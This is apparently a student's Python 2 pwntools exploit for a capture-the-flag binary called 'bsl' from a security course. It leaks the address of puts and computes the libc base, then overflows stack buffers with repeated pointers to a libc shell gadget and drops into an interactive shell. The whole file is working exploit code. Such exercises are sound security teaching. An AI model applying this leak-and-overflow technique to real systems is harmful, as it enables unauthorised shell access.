#python2
from pwn import *

context.binary = './bsl'

io = process("./bsl")
#io = remote("plzpwn.me", 8001)

print(io.recvuntil("Will you be my friend? (y/n)"))
io.sendline("y")

"""     printf(
      "Since we are now besties, we need to know each others most and least favourite things. I'll start!\n"
      "I absolutely LOVE numbers! They are all I can think about! My current favourite is: %p\n",
      &puts);
"""

print(io.recvuntil("I absolutely LOVE numbers! They are all I can think about! My current favourite is:"))
addr_puts = io.recvline().strip()
print("[] addr_puts: "+addr_puts)
# 0xf75a5b40

# """ ============================Most fav=============================="""

print(io.recvuntil("Do you want to learn an interesting fact about a number? (y/n)"))
io.sendline("y")

"""
  char buf1[1337]; // [esp+7h] [ebp-541h]
  ...
  if ( get_answer() )
  most_fav(buf1);
    ...
    puts("Zero... The first number I ever learnt, and the number of besties I had before I met you!");
    puts("Now it's your turn to tell me an interesting number fact!");
    fgets(buf1, 1336, stdin);
"""

print(io.recvuntil("Whats your favourite number?"))
io.sendline("0")

print(io.recvuntil("Zero... The first number I ever learnt, and the number of besties I had before I met you!"))
print(io.recvuntil("your turn to tell me an interesting number fact!"))

print("[] Sending wtf1")
# 7 x 191 = 1337
wtf_buffer1 = cyclic(512) # 1337
io.sendline(wtf_buffer1)
print("[] Sending wtf1 done")


# """ ============================Least fav II =============================="""

"""
  char buf2[200]; // [esp+8h] [ebp-D0h]

  printf("Mine is: %p\nWhats yours?\n", get_number);
  num = get_number();
  printf("Oh you don't like the number %d? Why not?\n", num);
  fgets(buf2, 209, stdin);
  if ( num == 1 )
    result = 6447;
  else
    result = 0;
"""

io.recvuntil("Do you have a LEAST favourite number? (y/n)")
io.sendline("y")

print(io.recvuntil("Mine is:"))
addr_get_number = io.recvline().strip()
print("[]addr_get_number : "+addr_get_number)
print(io.recvuntil("Whats yours?"))

# COMP6451 = bloody bitcoin/ethereum madness. Totally recommend after 6447 10/10
wtf_buffer2 = "6451" 
io.sendline(wtf_buffer2)

print(io.recvuntil("Why not?"))

# =======================Gen payload==============================


ida_getnumber = 0x00000713	
ida_fav = 0x000008B7
ida_relative_fav_push_puts = ida_fav + 0x7B

libc6_2273ubuntu1_i386_offset_puts = 0x00067b40

libc_base = int(addr_puts, 16) - libc6_2273ubuntu1_i386_offset_puts
libc_okbinsh = libc_base + 0x137e5e

print("libc_base : "+str(hex(libc_base)))
print("libc_okbinsh : "+str(hex(libc_okbinsh)))

buf = int(addr_get_number,16)

print("buf: "+str(hex(buf)))
buf = str(p32(buf))

pay1 = ""
pay1 += p32(libc_okbinsh)*53

print("Pay len: "+str(len(pay1)))
io.sendline(pay1)

io.interactive()

"""
ROP pointers
"""


